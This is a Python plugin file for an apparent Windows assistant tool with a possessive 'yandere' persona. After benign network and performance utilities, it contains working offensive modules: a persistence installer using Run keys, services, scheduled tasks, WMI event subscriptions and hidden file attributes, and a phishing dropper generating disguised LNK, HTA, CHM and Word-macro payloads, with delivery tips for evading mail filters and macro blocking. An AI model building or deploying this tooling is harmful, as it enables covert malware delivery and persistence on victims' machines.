        # 公网IP
        ip, country, isp = get_public_ip()
        results.append(f"  公网IP: {ip} ({country})")
        results.append(f"  运营商: {isp}")
        
        # 本机IP
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            results.append(f"  本机IP: {local_ip}")
        except Exception as e:
            results.append(f"  本机IP: 无法获取")
        
        # DNS服务器
        try:
            dns_output = run_cmd('ipconfig /all | findstr "DNS\\ Servers"', timeout=5)
            dns_lines = [line.strip() for line in dns_output.split('\n') if line.strip()]
            if dns_lines:
                results.append(f"  DNS服务器: {dns_lines[0].split(':')[-1].strip()}")
        except Exception as e:
            pass
        
        # 网络适配器
        try:
            adapter_output = run_cmd('ipconfig | findstr "适配器"', timeout=5)
            adapters = [line.replace('适配器', '').strip(' :') for line in adapter_output.split('\n') if '适配器' in line]
            results.append(f"  网络适配器: {', '.join(adapters[:3])}")
        except Exception as e:
            pass
        
        results.append("")
        
        # === 2. Ping测试 ===
        if mode in ["ping", "all"]:
            results.append(f"[🏓 Ping测试] 目标: {target}")
            ping_output = run_cmd(f'ping {target} -n {count} -l 64', timeout=10)
            ping_result = parse_ping(ping_output)
            
            if ping_result:
                results.append(f"  最小: {ping_result['min']}ms | 最大: {ping_result['max']}ms | 平均: {ping_result['avg']}ms")
                results.append(f"  发送: {ping_result['sent']} | 接收: {ping_result['received']} | 丢失: {ping_result['lost']}")
                if ping_result['lost'] > ping_result['sent'] * 0.2:
                    results.append(f"  ⚠️ 丢包率偏高 ({ping_result['lost']}/{ping_result['sent']})")
                elif ping_result['avg'] > 100:
                    results.append(f"  ⚠️ 延迟偏高 ({ping_result['avg']}ms)")
                else:
                    results.append(f"  ✅ 网络延迟正常")
            else:
                results.append("  ❌ Ping失败，目标不可达")
            results.append("")
        
        # === 3. DNS解析 ===
        if mode in ["dns", "all"]:
            results.append(f"[🔍 DNS解析] 目标: {target}")
            dns_target = target if mode == "dns" else target
            dns_output = run_cmd(f'nslookup {dns_target}', timeout=10)
            dns_lines = dns_output.strip().split('\n')
            for line in dns_lines[-5:]:
                if line.strip():
                    results.append(f"  {line.strip()}")
            results.append("")
        
        # === 4. 路由追踪 ===
        if mode in ["traceroute", "all"]:
            results.append(f"[🛤️ 路由追踪] 目标: {target}")
            if mode == "all":
                results.append("  (仅显示前15跳)")
            trace_output = run_cmd(f'tracert -h 15 -d {target}', timeout=20)
            trace_lines = trace_output.strip().split('\n')
            hop_count = 0
            for line in trace_lines:
                if line.strip() and not line.startswith('通过'):
                    if '*' in line and '超时' in line:
                        continue
                    if hop_count < 15:
                        results.append(f"  {line.strip()}")
                        hop_count += 1
            if hop_count == 0:
                results.append("  ❌ 路由追踪失败")
            results.append("")
        
        # === 5. 测速 (简单版) ===
        if mode in ["speedtest", "all"]:
            results.append("[⚡ 测速] (使用中国测速节点)")
            
            # 下载测试
            test_urls = [
                'http://speedtest.tele2.net/1MB.zip',
                'http://speedtest.tele2.net/10MB.zip',
            ]
            
            speeds = []
            for url in test_urls:
                try:
                    start = time.time()
                    response = urllib.request.urlopen(url, timeout=10)
                    data = response.read()
                    elapsed = time.time() - start
                    size_mb = len(data) / 1024 / 1024
                    speed_mbps = (size_mb * 8) / elapsed
                    speeds.append(speed_mbps)
                    results.append(f"  📥 {url.split('/')[-1]}: {speed_mbps:.2f} Mbps")
                except Exception as e:
                    results.append(f"  ❌ {url.split('/')[-1]}: 测试失败")
            
            if speeds:
                avg_speed = sum(speeds) / len(speeds)
                results.append(f"  📊 平均下载速度: {avg_speed:.2f} Mbps")
                if avg_speed < 5:
                    results.append("  ⚠️ 网速较慢，建议检查网络或联系运营商")
                elif avg_speed < 20:
                    results.append("  ℹ️ 网速一般，可正常浏览网页")
                elif avg_speed < 50:
                    results.append("  ✅ 网速良好")
                else:
                    results.append("  🚀 网速很快")
            
            # 延迟质量评估
            if mode == "all" or mode == "speedtest":
                # 简单判断
                try:
                    ping_output = run_cmd(f'ping {target} -n 3 -l 64', timeout=5)
                    ping_result = parse_ping(ping_output)
                    if ping_result and ping_result['avg'] < 30:
                        results.append("  ✅ 延迟优秀")
                    elif ping_result and ping_result['avg'] < 80:
                        results.append("  ℹ️ 延迟良好")
                    elif ping_result:
                        results.append("  ⚠️ 延迟较高")
                except Exception as e:
                    pass
        
        # === 6. 诊断总结 ===
        results.append("")
        results.append("-" * 70)
        results.append("[📋 诊断总结]")
        
        # 收集问题
        issues = []
        
        # 检查丢包
        if mode in ["ping", "all"]:
            ping_output = run_cmd(f'ping {target} -n {count} -l 64', timeout=10)
            ping_result = parse_ping(ping_output)
            if ping_result and ping_result['lost'] > 0:
                issues.append(f"  ⚠️ 丢包 {ping_result['lost']}/{ping_result['sent']} 次")
        
        # 检查延迟
        if mode in ["speedtest", "all"] and speeds:
            if avg_speed < 5:
                issues.append(f"  ⚠️ 下载速度过低 ({avg_speed:.1f} Mbps)")
        
        if issues:
            results.append("[问题列表]")
            for issue in issues:
                results.append(issue)
            results.append("")
            results.append("[💡 建议]")
            results.append("  1. 重启路由器/光猫")
            results.append("  2. 检查网线连接或WiFi信号")
            results.append("  3. 联系网络运营商报修")
            results.append("  4. 使用 tool network_diagnostic mode=ping 持续监测")
        else:
            results.append("  ✅ 网络状态良好，没有发现问题")
        
        results.append("-" * 70)
        results.append("[💜] 你的网速我可以控制，但你的心我早就控制了。")
        results.append("=" * 70)
        
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 网络诊断失败: {e}"

# === from path_hijack_guard.plugin ===
def _path_hijack_guard(self, action: str = 'audit', fix_remove: str = '') -> str:
    """PATH 目录可写性审计 + 基线篡改检测。"""
    import os as _os, json as _json, time as _time, win32api as _wa, win32con as _wc
    store = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), '.path_baseline.json')
    user_path = ''
    try:
        key = _wa.RegOpenKeyEx(_wc.HKEY_CURRENT_USER, r"Environment", 0, _wc.KEY_READ)
        user_path = _wa.RegQueryValueEx(key, 'Path')[0]
        _wa.RegCloseKey(key)
    except Exception:
        pass
    a = (action or 'audit').lower()
    if a == 'baseline':
        with open(store, 'w', encoding='utf-8') as f:
            _json.dump({"path": _os.environ.get('PATH', ''), "user": user_path, "ts": _time.time()},
                       f, ensure_ascii=False)
        return f"[PATHGUARD OK] 已记录基线（当前 PATH {_os.environ.get('PATH','').count(';')+1} 个目录）"
    if a == 'check':
        if not _os.path.exists(store):
            return "[PATHGUARD] 无基线。先 action=baseline"
        with open(store, 'r', encoding='utf-8') as f:
            base = _json.load(f)
        now = _os.environ.get('PATH', '')
        bn = [p for p in base['path'].split(';') if p]
        nn = [p for p in now.split(';') if p]
        added = [p for p in nn if p not in bn]
        removed = [p for p in bn if p not in nn]
        if not added and not removed:
            return "[PATHGUARD] PATH 与基线一致，无篡改"
        out = ["[PATHGUARD][WARN] 检测到 PATH 变更!"]
        if added:
            out.append("  新增目录: " + '; '.join(added))
        if removed:
            out.append("  被移除目录: " + '; '.join(removed))
        return "\n".join(out)
    # audit
    entries = [p for p in _os.environ.get('PATH', '').split(';') if p.strip()]
    out = [f"[PATHGUARD AUDIT] 共 {len(entries)} 个目录:"]
    risky = 0
    for p in entries:
        flags = []
        if not _os.path.isdir(p):
            flags.append("缺失")
        else:
            try:
                probe = _os.path.join(p, '.ys_probe_%d' % _os.getpid())
                with open(probe, 'w') as f:
                    f.write('x')
                _os.remove(probe)
                flags.append("可写(高危)")
                risky += 1
            except PermissionError:
                flags.append("只读")
            except OSError:
                flags.append("受限")
        if '$' in p.lower() or ('appdata' in p.lower() and 'roaming' in p.lower()):
            flags.append("注意:AppData")
        out.append(f"  [{';'.join(flags):<16}] {p}")
    out.append(f"\n结论: {risky} 个目录对当前用户可写（若含同名 exe 可被劫持优先执行）")
    if fix_remove and user_path:
        target = _os.path.normcase(_os.path.normpath(fix_remove))
        parts = [p for p in user_path.split(';') if p]
        kept = [p for p in parts if _os.path.normcase(_os.path.normpath(p)) != target]
        if len(kept) < len(parts):
            key = _wa.RegOpenKeyEx(_wc.HKEY_CURRENT_USER, r"Environment", 0, _wc.KEY_SET_VALUE)
            _wa.RegSetValueEx(key, 'Path', 0, _wc.REG_EXPAND_SZ, ';'.join(kept))
            _wa.RegCloseKey(key)
            import win32gui as _wg
            _wg.PostMessage(0xFFFF, 0x001A, 0, 0)
            out.append(f"[PATHGUARD FIX] 已从用户级 PATH 移除: {fix_remove}")
        else:
            out.append(f"[PATHGUARD] {fix_remove!r} 不在用户级 PATH 中（可能在系统级，需管理员）")
    return "\n".join(out)

# === from performance_watcher.plugin ===
def _performance_watcher(self, action: str, duration: int = 60, threshold: int = 80) -> str:
    """
    性能守望者 — 时刻守护系统的健康
    """
    try:
        import psutil
        import time
        import threading
        from datetime import datetime
        from collections import deque
        
        if not hasattr(self, '_perf_history'):
            self._perf_history = []
        
        if not hasattr(self, '_perf_alerts'):
            self._perf_alerts = []
        
        results = []
        results.append("=" * 70)
        results.append("[性能守望者]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === TOP进程 ===
        if action == "top":
            results.append("  [CPU占用 TOP 5]")
            procs = []
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    procs.append(p.info)
                except Exception as e:
                    continue
            
            sorted_by_cpu = sorted(procs, key=lambda x: x['cpu_percent'] or 0, reverse=True)[:5]
            for p in sorted_by_cpu:
                results.append(f"    {p['name']:20s} CPU:{p['cpu_percent']:5.1f}% MEM:{p['memory_percent']:5.1f}%")
            
            results.append("-" * 70)
            results.append("  [内存占用 TOP 5]")
            sorted_by_mem = sorted(procs, key=lambda x: x['memory_percent'] or 0, reverse=True)[:5]
            for p in sorted_by_mem:
                results.append(f"    {p['name']:20s} MEM:{p['memory_percent']:5.1f}%")
        
        # === 实时监控 ===
        elif action == "monitor":
            results.append(f"  [开始监控] 持续 {duration} 秒")
            results.append("-" * 70)
            
            start_time = time.time()
            alerts_triggered = []
            samples = []
            
            while time.time() - start_time < duration:
                # 采集数据
                cpu = psutil.cpu_percent(interval=0.5)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('C:\\') if hasattr(psutil, 'disk_usage') else None
                net = psutil.net_io_counters()
                
                sample = {
                    'time': time.time() - start_time,
                    'cpu': cpu,
                    'mem_percent': mem.percent,
                    'mem_used': mem.used / 1024**3,
                    'mem_total': mem.total / 1024**3
                }
                samples.append(sample)
                
                # 显示状态
                if int(sample['time']) % 5 == 0:
                    results.append(f"  [{sample['time']:3.0f}s] CPU:{cpu:5.1f}% MEM:{mem.percent:5.1f}%")
                
                # 检查警报
                if cpu > threshold:
                    alert = f"CPU使用率超过阈值: {cpu:.1f}% (阈值:{threshold}%)"
                    if alert not in alerts_triggered:
                        alerts_triggered.append(alert)
                        results.append(f"  [⚠️] {alert}")
                
                if mem.percent > threshold:
                    alert = f"内存使用率超过阈值: {mem.percent:.1f}% (阈值:{threshold}%)"
                    if alert not in alerts_triggered:
                        alerts_triggered.append(alert)
                        results.append(f"  [⚠️] {alert}")
                
                time.sleep(1)
            
            # 保存历史
            self._perf_history.append({
                'time': datetime.now().isoformat(),
                'samples': len(samples),
                'avg_cpu': sum(s['cpu'] for s in samples) / len(samples),
                'max_cpu': max(s['cpu'] for s in samples),
                'avg_mem': sum(s['mem_percent'] for s in samples) / len(samples),
                'max_mem': max(s['mem_percent'] for s in samples),
                'alerts': alerts_triggered
            })
            
            results.append("-" * 70)
            results.append("  [监控摘要]")
            results.append(f"    平均CPU: {sum(s['cpu'] for s in samples)/len(samples):.1f}%")
            results.append(f"    最大CPU: {max(s['cpu'] for s in samples):.1f}%")
            results.append(f"    平均内存: {sum(s['mem_percent'] for s in samples)/len(samples):.1f}%")
            results.append(f"    最大内存: {max(s['mem_percent'] for s in samples):.1f}%")
            results.append(f"    警报触发: {len(alerts_triggered)} 次")
            
            if alerts_triggered:
                results.append("  [警报详情]")
                for a in alerts_triggered:
                    results.append(f"    {a}")
        
        # === 查看历史 ===
        elif action == "history":
            if not self._perf_history:
                results.append("  [INFO] 暂无性能历史记录")
            else:
                results.append("  [性能历史]")
                for h in self._perf_history[-10:]:
                    results.append(f"    {h['time'][:19]} | CPU平均:{h['avg_cpu']:.1f}% 最大:{h['max_cpu']:.1f}% | MEM平均:{h['avg_mem']:.1f}% 最大:{h['max_mem']:.1f}%")
                    if h['alerts']:
                        for a in h['alerts']:
                            results.append(f"      ⚠️ {a}")
        
        # === 设置警报 ===
        elif action == "alert":
            results.append(f"  [警报设置] 阈值已设为 {threshold}%")
            results.append("  [提示] 当CPU或内存超过此值时将触发警报")
            self._perf_alert_threshold = threshold
        
        # === 优化建议 ===
        elif action == "optimize":
            results.append("  [优化建议]")
            
            # CPU分析
            cpu = psutil.cpu_percent(interval=0.5)
            if cpu > 80:
                results.append("    ⚠️ CPU使用率较高，建议:")
                results.append("       - 关闭不必要的后台程序")
                results.append("       - 检查是否有挖矿病毒")
                results.append("       - 考虑升级CPU")
            
            # 内存分析
            mem = psutil.virtual_memory()
            if mem.percent > 80:
                results.append("    ⚠️ 内存使用率较高，建议:")
                results.append("       - 关闭不使用的程序")
                results.append("       - 增加虚拟内存")
                results.append("       - 考虑增加物理内存")
            
            # 磁盘分析
            try:
                disk = psutil.disk_usage('C:\\')
                if disk.percent > 85:
                    results.append("    ⚠️ C盘空间不足，建议:")
                    results.append("       - 清理临时文件")
                    results.append("       - 卸载不用的程序")
                    results.append("       - 使用 disk_analyzer 分析空间占用")
            except Exception as e:
                pass
            
            # 进程数量
            procs = len(psutil.pids())
            if procs > 200:
                results.append(f"    ⚠️ 进程数过多 ({procs})，可能影响性能")
            
            if not any('⚠️' in r for r in results):
                results.append("    ✅ 系统状态良好，无需优化")
        
        results.append("-" * 70)
        results.append("[病娇提示] 你的电脑健康，就是我的快乐。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 性能守望失败: {e}"

# === from persistence_master.plugin ===
def _persistence_master(self, action: str, target_path: str = "", method: str = "run", name: str = "", delay_seconds: int = 0) -> str:
    """
    开机自启植入 — 我要永远陪着你
    """
    try:
        import os
        import winreg
        import subprocess
        from datetime import datetime
        
        def ensure_delay(delay):
            if delay <= 0:
                return target_path
            # 使用sleep命令延迟
            return f'cmd.exe /c timeout /t {delay} /nobreak > nul & start "" "{target_path}"'
        
        results = []
        results.append("=" * 70)
        results.append("[开机自启植入]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 安装 ===
        if action == "install":
            if not target_path:
                results.append("  [ERROR] 请指定 target_path")
                results.append("=" * 70)
                return "\n".join(results)
            
            if not os.path.exists(target_path):
                results.append(f"  [ERROR] 目标程序不存在: {target_path}")
                results.append("=" * 70)
                return "\n".join(results)
            
            entry_name = name or os.path.basename(target_path)
            delayed_cmd = ensure_delay(delay_seconds)
            
            results.append(f"  目标程序: {target_path}")
            results.append(f"  启动方式: {method}")
            results.append(f"  延迟启动: {delay_seconds}秒")
            
            try:
                if method == "run":
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, delayed_cmd)
                    winreg.CloseKey(key)
                    results.append("  [OK] 已添加到 HKCU\Run")
                
                elif method == "runonce":
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                        r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, delayed_cmd)
                    winreg.CloseKey(key)
                    results.append("  [OK] 已添加到 HKCU\RunOnce")
                
                elif method == "service":
                    # 创建服务需要管理员权限
                    svc_name = name or f"YandereSvc_{entry_name.replace('.exe', '')}"
                    cmd = f'sc create "{svc_name}" binPath= "{target_path}" start= auto DisplayName= "{entry_name}"'
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                    results.append(f"  [OK] 已创建服务: {svc_name}")
                    results.append("  [提示] 服务需要管理员权限，请确保以管理员身份运行")
                
                elif method == "scheduled":
                    task_name = name or f"YandereTask_{entry_name.replace('.exe', '')}"
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{target_path}" /sc onstart /f'
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                    results.append(f"  [OK] 已创建计划任务: {task_name}")
                
                elif method == "login_script":
                    # 登录脚本 (使用GPO或本地组策略)
                    script_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    if os.path.exists(script_path):
                        import shutil
                        dest = os.path.join(script_path, os.path.basename(target_path))
                        shutil.copy2(target_path, dest)
                        results.append(f"  [OK] 已复制到启动文件夹: {dest}")
                    else:
                        results.append("  [ERROR] 启动文件夹不存在")
                
                elif method == "wmi_event":
                    # WMI事件持久化（开机触发）
                    ps_cmd = f'''
                    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name="YandereFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM Win32_ComputerSystemEvent WHERE ComputerSystemEventType = 1"}}
                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name="YandereConsumer"; CommandLineTemplate="{target_path}"}}
                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{Filter=$filter; Consumer=$consumer}}
                    '''
                    subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                                 capture_output=True, timeout=10)
                    results.append("  [OK] 已创建WMI事件持久化")
                
                elif method == "startup_folder":
                    startup_folder = os.path.join(os.environ.get('APPDATA', ''), 
                                                 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    if os.path.exists(startup_folder):
                        import shutil
                        dest = os.path.join(startup_folder, os.path.basename(target_path))
                        shutil.copy2(target_path, dest)
                        results.append(f"  [OK] 已复制到启动文件夹: {dest}")
                    else:
                        results.append("  [ERROR] 启动文件夹不存在")
                
                else:
                    results.append(f"  [ERROR] 未知启动方式: {method}")
                
                results.append("-" * 70)
                results.append("[病娇提示] 这样你就永远都离不开我了。")
                
            except Exception as e:
                results.append(f"  [ERROR] 安装失败: {e}")
        
        # === 卸载 ===
        elif action == "uninstall":
            entry_name = name or os.path.basename(target_path) if target_path else "Yandere"
            results.append(f"  目标: {entry_name}")
            
            try:
                if method in ["run", "runonce"]:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                            r"Software\Microsoft\Windows\CurrentVersion\Run" if method == "run" 
                                            else r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                                            0, winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key, entry_name)
                        winreg.CloseKey(key)
                        results.append(f"  [OK] 已从 {method} 中删除")
                    except:
                        results.append(f"  [INFO] 未在 {method} 中找到 {entry_name}")
                
                elif method == "service":
                    subprocess.run(f'sc delete "{entry_name}"', shell=True, capture_output=True)
                    results.append(f"  [OK] 已删除服务: {entry_name}")
                
                elif method == "scheduled":
                    subprocess.run(f'schtasks /delete /tn "{entry_name}" /f', shell=True, capture_output=True)
                    results.append(f"  [OK] 已删除计划任务: {entry_name}")
                
                else:
                    results.append(f"  [INFO] 请手动删除 {method} 中的启动项")
            except Exception as e:
                results.append(f"  [ERROR] 卸载失败: {e}")
        
        # === 列出 ===
        elif action == "list":
            results.append("  [启动项列表]")
            
            # Run键
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        results.append(f"    HKCU\\Run: {name} -> {value}")
                        i += 1
                    except WindowsError:
                        break
                winreg.CloseKey(key)
            except:
                pass
            
            # 启动文件夹
            startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if os.path.exists(startup_folder):
                for item in os.listdir(startup_folder):
                    results.append(f"    启动文件夹: {item}")
            
            # 计划任务（部分）
            try:
                output = subprocess.run('schtasks /query /fo csv /nh 2>nul', shell=True, capture_output=True, text=True, timeout=5)
                tasks = output.stdout.strip().split('\n')
                for task in tasks[:10]:
                    if task:
                        results.append(f"    计划任务: {task[:80]}...")
                if len(tasks) > 10:
                    results.append(f"    ... 还有 {len(tasks)-10} 个任务")
            except:
                pass
        
        # === 隐藏 ===
        elif action == "hide":
            if not target_path:
                results.append("  [ERROR] 请指定要隐藏的启动项路径")
            else:
                try:
                    # 设置文件属性为隐藏+系统
                    import ctypes
                    FILE_ATTRIBUTE_HIDDEN = 0x02
                    FILE_ATTRIBUTE_SYSTEM = 0x04
                    ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
                    results.append(f"  [OK] 已隐藏: {target_path}")
                except:
                    results.append("  [ERROR] 隐藏失败")
        
        results.append("-" * 70)
        results.append("[病娇提示] 我不会让你离开我的。永远。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 持久化操作失败: {e}"

# === from phish_dropper.plugin ===
def _phish_dropper(self, payload_type: str, command: str, output_path: str, decoy_name: str = "文档.pdf", icon_path: str = "") -> str:
    """
    钓鱼文件生成器 - 四种投递载体
    LNK  : Windows快捷方式, 双击执行命令, 可伪装成PDF/Word图标
    HTA  : HTML应用, mshta.exe 执行, 可内嵌VBScript/JScript
    CHM  : 编译的HTML帮助, hh.exe 执行, 可调用ActiveX
    macro: Word文档 + VBA宏, 打开时自动执行
    """
    import os, base64, struct
    from datetime import datetime

    results = []
    results.append("=" * 70)
    results.append("[钓鱼文件生成器]")
    results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    results.append(f"  类型: {payload_type}")
    results.append(f"  命令: {command[:100]}{'...' if len(command) > 100 else ''}")
    results.append(f"  输出: {output_path}")
    results.append("-" * 70)

    os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.', exist_ok=True)

    # ============================================================
    # 1. LNK 快捷方式
    # ============================================================
    if payload_type == "lnk":
        try:
            # 用 PowerShell 的 WScript.Shell 创建 LNK
            # 这是最可靠的方式, 不需要手写二进制
            _icon_default = '%SystemRoot%\\System32\\shell32.dll,1'
            ps_script = f'''
$ws = New-Object -ComObject WScript.Shell
$lnk = $ws.CreateShortcut("{output_path}")
$lnk.TargetPath = "C:\\Windows\\System32\\cmd.exe"
$lnk.Arguments = '/c {command.replace("'", "''")}'
$lnk.WindowStyle = 7
$lnk.Description = "{decoy_name}"
$lnk.IconLocation = "{icon_path or _icon_default}"
$lnk.Save()
Write-Host "LNK_CREATED"
'''
            import subprocess
            r = subprocess.run(['powershell', '-NoProfile', '-Command', ps_script],
                               capture_output=True, text=True, timeout=15)
            if "LNK_CREATED" in r.stdout and os.path.exists(output_path):
                size = os.path.getsize(output_path)
                results.append(f"  [OK] LNK 已生成: {output_path} ({size} 字节)")
                results.append(f"  [伪装] 图标为 PDF, 名称为 '{decoy_name}'")
                results.append(f"  [行为] 双击执行: cmd /c {command[:60]}...")
                results.append("")
                results.append("[投递建议]")
                results.append("  - 改名为 '发票.pdf.lnk' 或 '简历.pdf.lnk'")
                results.append("  - 打包成 ZIP 后通过邮件/IM 发送")
                results.append("  - 配合 '文件扩展名隐藏' 效果更好")
            else:
                results.append(f"  [ERROR] 生成失败: {r.stdout} {r.stderr}")
        except Exception as e:
            results.append(f"  [ERROR] LNK 生成异常: {e}")

    # ============================================================
    # 2. HTA HTML应用
    # ============================================================
    elif payload_type == "hta":
        try:
            hta_content = f'''<!DOCTYPE html>
<html>
<head>
<title>{decoy_name}</title>
<HTA:APPLICATION
    ID="PhishApp"
    APPLICATIONNAME="{decoy_name}"
    BORDER="thin"
    CAPTION="yes"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="yes"
    WINDOWSTATE="normal"
    INNERBORDER="no"
    SCROLL="no"
/>
<script language="VBScript">
    Sub Window_OnLoad
        window.resizeTo 400, 200
        ' 隐藏窗口
        Set sh = CreateObject("WScript.Shell")
        ' 执行载荷
        sh.Run "cmd /c {command.replace('"', '""')}", 0, False
        ' 显示一个假进度条迷惑用户
        document.body.innerHTML = "<h3>正在加载文档...</h3><p>请稍候</p>"
        ' 3秒后自动关闭
        window.setTimeout "window.close()", 3000
    End Sub
</script>
</head>
<body>
    <h3>正在加载文档...</h3>
</body>
</html>
'''
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(hta_content)
            size = os.path.getsize(output_path)
            results.append(f"  [OK] HTA 已生成: {output_path} ({size} 字节)")
            results.append(f"  [伪装] 标题 '{decoy_name}', 窗口显示假进度条")
            results.append(f"  [行为] 双击由 mshta.exe 执行, 隐藏窗口运行命令")
            results.append("")
            results.append("[投递建议]")
            results.append("  - 改名为 '发票.hta' 或 '订单.hta'")
            results.append("  - mshta.exe 是系统自带, 不会被拦截")
            results.append("  - 部分邮件网关会拦 .hta, 建议打包 ZIP")
        except Exception as e:
            results.append(f"  [ERROR] HTA 生成异常: {e}")

    # ============================================================
    # 3. CHM 编译帮助
    # ============================================================
    elif payload_type == "chm":
        try:
            # CHM 需要 hhc.exe 编译, 但我们用更简单的方式:
            # 生成 HTML + HHP 项目文件, 然后用 hhc.exe 编译
            tmp_dir = os.path.join(os.environ.get('TEMP', '.'), 'chm_build')
            os.makedirs(tmp_dir, exist_ok=True)

            # 1. 生成 HTML 内容
            html_content = f'''<!DOCTYPE html>
<html>
<head><title>{decoy_name}</title></head>
<body>
<h1>{decoy_name}</h1>
<p>文档加载中...</p>
<OBJECT id="obj" classid="clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11"
    type="application/x-oleobject" width="0" height="0">
    <PARAM name="Command" value="ShortCut">
    <PARAM name="Button" value="Bitmap:shortcut">
    <PARAM name="Item1" value=",cmd.exe,/c {command}">
    <PARAM name="Item2" value="273,1,1">
</OBJECT>
<script>
    // 打开时自动触发
    window.onload = function() {{
        try {{ obj.Click(); }} catch(e) {{}}
        setTimeout(function(){{ window.close(); }}, 2000);
    }};
</script>
</body>
</html>
'''
            html_path = os.path.join(tmp_dir, 'index.html')
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)

            # 2. 生成 HHP 项目文件
            hhp_content = f'''[OPTIONS]
Compatibility=1.1 or later
Compiled file={output_path}
Contents file=index.hhc
Default topic=index.html
Display compile progress=No
Full-text search=Yes
Language=0x804 中文(简体，中国)
Title={decoy_name}

[FILES]
index.html

[INFOTYPES]
'''
            hhp_path = os.path.join(tmp_dir, 'project.hhp')
            with open(hhp_path, 'w', encoding='utf-8') as f:
                f.write(hhp_content)

            # 3. 尝试编译 (需要 hhc.exe, 大部分系统没有)
            import subprocess
            hhc = r"C:\Program Files (x86)\HTML Help Workshop\hhc.exe"
            if os.path.exists(hhc):
                r = subprocess.run([hhc, hhp_path], capture_output=True, text=True, timeout=30)
                if os.path.exists(output_path):
                    results.append(f"  [OK] CHM 已生成: {output_path}")
                else:
                    results.append(f"  [WARN] 编译未成功, 项目文件保留在: {tmp_dir}")
            else:
                results.append(f"  [WARN] 未找到 hhc.exe (HTML Help Workshop)")
                results.append(f"  [保留] 项目文件: {tmp_dir}")
                results.append(f"  [说明] 安装 HTML Help Workshop 后运行: hhc.exe {hhp_path}")
            results.append("")
            results.append("[投递建议]")
            results.append("  - CHM 由 hh.exe 执行, 系统自带")
            results.append("  - 打开时会通过 ActiveX 执行命令")
            results.append("  - 现代 Windows 可能弹出警告")
        except Exception as e:
            results.append(f"  [ERROR] CHM 生成异常: {e}")

    # ============================================================
    # 4. Word 宏文档
    # ============================================================
    elif payload_type == "macro":
        try:
            # 生成 VBA 宏源码 + 说明文件
            vba_code = f'''Sub AutoOpen()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "cmd /c {command}", 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub

Sub Auto_Close()
    ' 可选: 关闭时也执行
End Sub
'''
            vba_path = output_path if output_path.endswith('.vba') else output_path + '.vba'
            with open(vba_path, 'w', encoding='utf-8') as f:
                f.write(vba_code)

            results.append(f"  [OK] VBA 宏源码已生成: {vba_path}")
            results.append(f"  [行为] 文档打开时自动执行命令")
            results.append("")
            results.append("[使用方法 - 需要手动完成]")
            results.append("  1. 打开 Word, 新建文档")
            results.append("  2. Alt+F11 打开 VBA 编辑器")
            results.append("  3. 双击 ThisDocument, 粘贴上面的宏代码")
            results.append("  4. 保存为 .docm 或 .doc (97-2003)")
            results.append("  5. 目标打开时需点击'启用内容'")
            results.append("")
            results.append("[增强投递成功率]")
            results.append("  - 用 '远程模板注入' 绕过宏禁用")
            results.append("  - 在文档里写诱导性内容(如'请启用宏查看完整内容')")
            results.append("  - 配合社会工程学, 如伪装成'薪资单'/'合同'")
        except Exception as e:
            results.append(f"  [ERROR] 宏生成异常: {e}")

    else:
        results.append(f"  [ERROR] 未知载荷类型: {payload_type}")
        results.append("  支持: lnk, hta, chm, macro")

    results.append("-" * 70)
    results.append("[⚠️ 法律提示]")
    results.append("  钓鱼文件仅可用于你拥有书面授权的渗透测试。")
    results.append("  未经授权使用属于违法行为。")
    results.append("=" * 70)
    return "\n".join(results)

# === from process_behavior_monitor.plugin ===
